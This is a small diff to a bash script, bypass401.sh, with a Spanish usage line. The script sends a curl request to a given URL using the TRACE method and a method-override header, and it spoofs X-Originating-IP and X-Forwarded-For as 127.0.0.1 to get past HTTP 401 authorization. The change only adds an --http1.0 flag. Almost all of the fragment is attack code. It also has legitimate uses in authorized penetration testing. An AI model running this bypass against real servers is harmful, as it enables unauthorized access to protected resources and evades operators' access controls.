@@ -1,7 +1,7 @@
 #!/bin/bash
 echo "Uso.: ./bypass401.sh https://url"
 # Otros metodos HTTP: -X ARBITRARY ACL TRACK
-curl -k -s -vvv $1 -X "TRACE" \
+curl -k -s --http1.0 -vvv $1 -X "TRACE" \
 -H "X-HTTP-Method-Override: ACL" \
 -H "X-Originating-IP: 127.0.0.1" \
 -H "X-Forwarded-For: 127.0.0.1" \
